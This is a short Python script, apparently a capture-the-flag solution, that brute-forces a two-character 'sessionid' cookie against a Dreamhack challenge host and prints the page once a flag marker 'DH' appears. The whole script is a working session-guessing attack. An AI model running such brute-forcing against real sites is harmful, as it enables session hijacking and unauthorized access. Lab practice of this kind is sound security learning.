import requests
url="http://host3.dreamhack.games:8333/"
str = "a456789"
check=True
for i in str:
    for j in str:
        res=requests.get(url,cookies={"sessionid":i+j})
        print(i+j)
        if "DH" in res.text:
            print(res.text)
            check = False
            break
    if check == False:
        break